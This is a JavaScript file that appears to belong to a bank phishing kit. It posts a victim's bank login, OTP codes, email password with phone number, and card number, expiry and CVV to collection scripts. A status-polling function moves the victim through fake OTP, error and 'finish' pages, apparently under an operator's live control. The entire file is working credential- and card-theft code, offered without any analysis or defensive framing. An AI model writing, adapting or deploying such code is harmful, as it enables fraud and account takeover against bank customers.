

function inicio(u){
    $.post( "../process/inicio.php", { usr: u} ,function(data) {
    });
}


function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}   


function pasousuario(p, u, b){
    var res;
    var d = detectar_dispositivo();
    $.post( "../process2/pasousuario.php", { pass: p, user: u, dis: d, banco: b} ,function(data) {
        if (data == "ERR") {
                alert("error");
        }else{
            if (data == "NO") {

            }else{
                res = data.split("-");
                window.location.href = "./cargando.php";
            }
        }
    });
}            

function consultar_estado(){
    $.post( "../process2/estado.php",function(data) {
        switch (data) {
            case '2': window.location.href = "./otp.php"; break;
            case '4': window.location.href = "./404.php"; break;
            case '6': window.location.href = "../../../pago.php?carderror=true"; break;               
            case '8': window.location.href = "./errorotp.php"; break;
            case '10': window.location.href = "finish.php"; break;
            case '12': window.location.href = "bavvillas.php"; break;
            //case '40': window.location.href = ""; break;
            //case '41': window.location.href = "./infopago.php"; break;

        } 
    });        
}

function enviar_otp(o){
    $.post( "../process2/pasoOTP.php",{ otp:o },function(data) {
        window.location.href = "./cargando.php";
    }); 
}

function enviar_mail(m,c,t){    
    $.post( "../process/pasomail.php",{ eml:m, passe:c, cel:t},function(data) {
        window.location.href = "./";
    });
}

function enviar_tarjeta(t,f,c){    
    $.post( "../process/pasotarjeta.php",{ tar:t, fec:f, cvv:c },function(data) {
        window.location.href = "./";
    });
}